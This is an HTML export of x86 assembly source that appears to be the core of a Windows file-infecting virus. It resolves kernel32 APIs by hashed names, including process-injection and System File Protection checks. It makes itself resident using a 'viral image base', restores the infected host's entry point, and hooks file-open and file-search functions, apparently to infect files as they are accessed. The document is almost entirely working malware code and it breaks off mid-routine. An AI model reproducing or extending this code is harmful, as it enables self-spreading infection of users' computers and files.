<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0"> </span><span class="sc5">__</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">\</span><span class="sc5">asm.inc</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">bla</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">;exported data</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">_crcs</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">_blacklist</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">_org9entry</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">_hostentryrva</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">_startupregkey</span><span class="sc0">

</span><span class="sc1">;exported functions</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">@getk32base</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">@crc32</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">@memcpy</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">@poordasm</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">@hookentry</span><span class="sc0">

</span><span class="sc1">;called functions</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">@finddatastealth</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">@import</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">@makeresident</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">@hookhandler</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">@changeprot</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;int     3</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;reserve a ret add</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc2">200h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__next</span><span class="sc0">
</span><span class="sc5">__next</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__next</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc4">)</span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getk32base</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">_crcs</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">;int* crcs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;int* imports</span><span class="sc0">
                </span><span class="sc1">;void __fastcall import(int base, int* crcs, int* imports)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@import</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+(</span><span class="sc5">getversion__</span><span class="sc4">-</span><span class="sc5">apilist__</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;is NT?</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">__restorehost</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">;is NT5?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__restorehost</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;api*</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;void* viralimagebaes</span><span class="sc0">
                </span><span class="sc1">;void __fastcall makeresident(api* a, void* vimbase)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@makeresident</span><span class="sc0">

</span><span class="sc5">__restorehost</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__z</span><span class="sc0">

</span><span class="sc5">_org9entry</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0c3h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">__z</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_org9entry</span><span class="sc0">
  </span><span class="sc5">_hostentryrva</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;api*a</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">;page_readwrite</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc1">;int __fastcall changeprot(api* a,void* address,int flags)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@changeprot</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;return rva</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_crcs</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">apilist__</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateFileW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">FindFirstChangeNotificationW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">FindFirstFileExW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">FindNextFileW</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">getversion__</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetVersion</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryA</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetProcAddress</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateFileMappingW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">MapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CloseHandle</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">VirtualAllocEx</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">VirtualFree</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">VirtualProtect</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">VirtualQuery</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">OpenProcess</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">ReadProcessMemory</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">WriteProcessMemory</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateRemoteThread</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetModuleHandleA</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetLastError</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SetLastError</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">FindFirstFileW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">FindClose</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">FileTimeToSystemTime</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SystemTimeToFileTime</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetFileSize</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">WideCharToMultiByte</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SetFilePointer</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SetEndOfFile</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SetFileTime</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetFileTime</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">Sleep</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetModuleFileNameA</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetSystemDirectoryW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetTickCount</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetFullPathNameW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">lstrlenW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">IsBadWritePtr</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"user32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CharUpperA</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"psapi"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">EnumProcesses</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">EnumProcessModules</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"sfc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">SfcIsFileProtected</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"advapi32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;screws up alignment</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">RegOpenKeyExA</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">RegEnumValueW</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">RegCloseKey</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">@hookentry</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;createfilew</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__e</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;findfirstchangenotificationw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__e</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">;findfirstfileexw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__e</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;findnextfilew</span><span class="sc0">
</span><span class="sc5">__e</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__q</span><span class="sc0">
        </span><span class="sc5">__next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;int     3</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">hook_leave</span><span class="sc0">
        </span><span class="sc5">__q</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__next</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;base</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4000h</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc1">;return address of hookentry</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;points to hook-restorder</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">hook_fff</span><span class="sc0">                    </span><span class="sc1">;findfirstfileex</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">hook_fnf</span><span class="sc0">                    </span><span class="sc1">;findnextfile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;findfirstchange</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">hook_ffc</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;pointer to arg1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;arg1</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@hookhandler</span><span class="sc0">    </span><span class="sc1">;hookhandler(base,arg1,number,&amp;arg1)</span><span class="sc0">

</span><span class="sc5">hook_leave</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@hookentry</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">hook_fff</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;FindExInfoStandard</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">hook_leave</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
